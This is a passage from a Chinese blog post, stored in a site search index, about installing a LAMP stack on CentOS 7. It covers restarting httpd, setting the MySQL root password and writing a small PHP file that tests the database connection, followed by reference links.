class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart httpd</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/d5mT6ZepRNru3Fz.png" alt="1564779090168.png"></p><p>设置root密码（我设置为123456）：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql_secure_installation</span> <br></code></pre></td></tr></table></figure><p>创建mysql.php文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/my</span>sql.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;mysql success!!!!!&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/9zjBnXxg5CJVYTu.png" alt="2.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>CentOS7快速搭建LNMP环境：<a href="https://www.jianshu.com/p/02baa54283ba">https://www.jianshu.com/p/02baa54283ba</a></p><p>搭建centos7环境：<a href="https://help.aliyun.com/document_detail/97251.html#title-pli-3k4-4n3">https://help.aliyun.com/document_detail/97251.html#title-pli-3k4-4n3</a></p><p>nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use) 错误解决：<a href="https://blog.csdn.net/ownfire/article/details/7966645">https://blog.csdn.net/ownfire/article/details/7966645</a></p><p>linux安全加固：<a href="https://blog.csdn.net/qq_36119192/article/details/82906799">https://blog.csdn.net/qq_36119192/article/details/82906799</a></p><p>用yum快速搭建LAMP平台：<a href="https://www.cnblogs.com/me80/p/7218883.html">https://www.cnblogs.com/me80/p/7218883.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
